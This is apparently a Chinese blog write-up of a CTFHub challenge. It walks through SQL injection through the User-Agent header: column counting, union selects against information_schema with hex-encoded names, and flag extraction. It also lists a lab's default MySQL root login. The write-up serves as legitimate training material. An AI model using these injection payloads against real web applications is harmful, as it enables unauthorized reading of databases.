---
layout: post
title: CTFHub UA注入Writeup
date: "2026-11-23 18:00:00 +0800"
categories: [CTF, CTFHub, Web]
tags: [ctfhub, mysql, sql-injection]
---

## 一、学习环境

- 靶机：CTFHub技能树UA注入
- 地址：http://challenge-85297b906acd5fe4.sandbox.ctfhub.com:10800
- 本地环境：OWASP BWA，192.168.216.129
- SSH：ssh bwa
- MySQL：mysql -u root -powaspbwa
- 常用库：dvwa、owasp10、bricks、peruggia、mutillidae
- 铁律：全程不用use，跨库一律写 库名.表名，或在information_schema里用where table_schema过滤

## 二、题目信息

- 平台：CTFHub
- 题型：Web，SQL注入
- 考点：User-Agent注入、union跨库取数、十六进制代替引号

## 三、解题思路

页面没有输入框，URL也没有参数，打开只显示一条新闻。

把整个User-Agent头当成输入试一下：默认浏览器UA时会显示ID为1、Data为ctfhub；把UA换成数字1，回显的SQL变成id=1。

这说明程序把User-Agent的值拼进了SQL。注入点从URL换到了请求头。

## 四、解题步骤

1、确认注入点在UA。用curl指定UA：

```
curl -A 1 http://靶机地址/
```

页面回显select * from news where id=1，并且显示ID为1、Data为ctfhub。

2、确认可控。UA换成1 and 1=2：

```
curl -A 1 and 1=2 http://靶机地址/
```

结果区空白，说明UA的值参与运算。

3、数列数。UA换成1 order by 2正常，换成1 order by 3空白，两列。

4、找回显位。UA换成999 union select 1,2，页面显示1和2。用999是因为1有数据，伪造行会被挤到第二行。

5、读库名。UA换成999 union select 1,database()，返回sqli。

6、读表名。UA换成：

```
999 union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x73716c69
```

0x73716c69是sqli的十六进制。返回pfmakgkrkt和news，随机名那张是目标。

7、读字段名。UA换成：

```
999 union select 1,group_concat(column_name) from information_schema.columns where table_schema=0x73716c69 and table_name=0x70666d616b676b726b74
```

0x70666d616b676b726b74是表名pfmakgkrkt的十六进制。返回字段名owzfpxrtfy。

8、取数据。UA换成：

```
999 union select 1,group_concat(owzfpxrtfy) from sqli.pfmakgkrkt
```

Data位置返回ctfhub{6584aca88edde80399324aa7}，即flag。

## 五、踩坑记录

**坑零：抄flag时漏字符**

现象：第一次提交提示flag错误。

原因：终端输出里连续两个8，肉眼读成一串，抄写时少了一个。

解决：用length确认长度是32，再用hex把整串转成十六进制，逐字节核对，避免肉眼误差。

**坑一：在地址栏找不到参数**

现象：页面没有输入框，URL没有id，不知道从哪注入。

原因：参数在User-Agent请求头里。

解决：用curl的-A参数，或者Burp抓包改请求头。

**坑二：以为UA只是身份标识**

现象：默认UA很长，是浏览器信息，看不出和数据库有关系。

原因：程序可能把UA写进访问日志表，或者直接拿它当查询条件。本题是后者。

解决：逐个请求头试，UA、Referer、Cookie、X-Forwarded-For都可能被拼进SQL。

**坑三：表名字段名随机**

现象：直接查flag表查不到。

原因：本题表名pfmakgkrkt、字段名owzfpxrtfy都是随机串。

解决：先查information_schema，再取数据。

## 六、问题与解答

**问：User-Agent是什么。**

答：浏览器每次请求都会带的一个请求头，内容是浏览器和操作系统的标识，比如Chrome在Windows上的那一长串。服务端用它统计来源。

**问：为什么UA能被注入。**

答：程序如果把这个值直接拼进SQL，比如写进日志表或当查询条件，却没有过滤，就会和URL参数一样被当成代码执行。

**问：怎么改UA。**

答：curl加-A参数；Burp抓到请求后改User-Agent那一行；浏览器插件也能改，但不方便。批量测试用前两种。

**问：这题为什么还要查information_schema。**

答：表名和字段名都是随机串，必须查目录。跨库用 库名.表名，或者where table_schema过滤，不用use。

## 七、总结

1、注入点不只在URL。Cookie、User-Agent、Referer、X-Forwarded-For都可能是入口。
2、找入口的方法：把每个可控的请求头换成数字，看回显的SQL有没有变化。
3、手法不变：数两列、找回显位、union查库表字段、取数据。
4、表名随机时，information_schema是唯一入口。
